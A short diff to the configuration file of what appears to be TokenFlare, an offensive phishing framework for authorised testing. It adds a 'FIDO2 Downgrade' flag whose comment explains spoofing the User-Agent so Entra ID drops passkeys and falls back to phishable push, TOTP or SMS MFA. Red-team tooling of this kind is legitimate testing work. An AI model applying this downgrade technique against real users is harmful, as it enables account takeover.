@@ -72,4 +72,9 @@ CUSTOM_USER_AGENT='TokenFlare/1.0 For_Authorised_Testing_Only'
 # CUSTOM_USER_AGENT='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15'
 # CUSTOM_USER_AGENT='Mozilla/5.0 Cloudflare is collecting our activities as threat intel'
 
+# --- FIDO2 Downgrade ---
+# When enabled, spoofs User-Agent to force Entra ID to disable passkey prompt
+# and fall back to phishable MFA methods (push, TOTP, SMS)
+FIDO2_DOWNGRADE = "false"
+
 
